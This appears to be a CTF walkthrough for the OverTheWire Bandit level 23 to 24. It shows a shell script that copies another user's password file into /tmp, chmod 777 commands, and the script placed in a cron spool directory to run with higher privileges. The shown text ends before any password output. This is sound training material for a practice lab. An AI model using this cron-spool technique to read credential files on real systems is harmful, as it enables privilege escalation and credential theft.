A program is running automatically at regular intervals from cron, the time-based job scheduler.
Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script.
This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy aroundâ€¦

checking /var/spool/bandit23 , only /var/spool/bandit24 and it says permission denied
okay so it says we will be writing our first bash script 

so lets make folder in /tmp/ i called it menz

and write a script to get bandit24 password stored in /etc/bandit_pass/bandit24

```shell
bandit23@bandit:/tmp/menz$ cat menz.sh                                                                                   
#!/bin/bash                                                                                                              
                                                                                                                         
cat /etc/bandit_pass/bandit24 > /tmp/menz/pass.txt   
```
so it cat the file and save it in our directory with name pass.txt

now we need 2 more things , permission for the script to execute 
```shell
chmod 777 menz.sh
```
and permission for the folder to write in

```shell 
chmod 777 /tmp/menz/
```
now copy the bash script to /var/spool/bandit24/

wait for some time because its a scheduled task

and finally we have our pass.txt
```shell
bandit23@bandit:/tmp/menz$ ls                                                                                            
menz.sh  pass.txt
bandit23@bandit:/tmp/menz$ cat pass.txt
